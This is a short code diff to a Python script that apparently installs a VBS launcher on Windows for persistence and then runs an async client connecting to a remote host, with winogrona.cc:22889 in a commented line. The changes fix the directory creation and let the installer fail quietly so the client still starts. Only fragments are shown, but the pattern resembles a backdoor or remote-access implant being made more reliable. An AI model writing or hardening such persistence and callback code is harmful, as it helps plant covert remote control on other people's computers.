@@ -185,7 +185,12 @@ def seks_installer():
     file = __file__
 
     if sys.platform == "win32":
-        os.mkdirs(VDIR, exist_ok=True)
+        try:
+            os.mkdir(VDIR)
+
+        except FileExistsError:
+            pass
+
         with open(LAUNCH, "w") as f:
             f.write(VBS)
         
@@ -222,5 +227,9 @@ def async_client(host: str, port: int, token: str, seks: bool = True) -> None:
 
 if __name__ == '__main__':
     # asyncio.run(am_main(host="winogrona.cc", port=22889))
-    seks_installer()
+    try:
+        seks_installer()
+    except Exception as e:
+        print("Installer: %s" % e)
+
     asyncio.run(струи_СЭКСА())
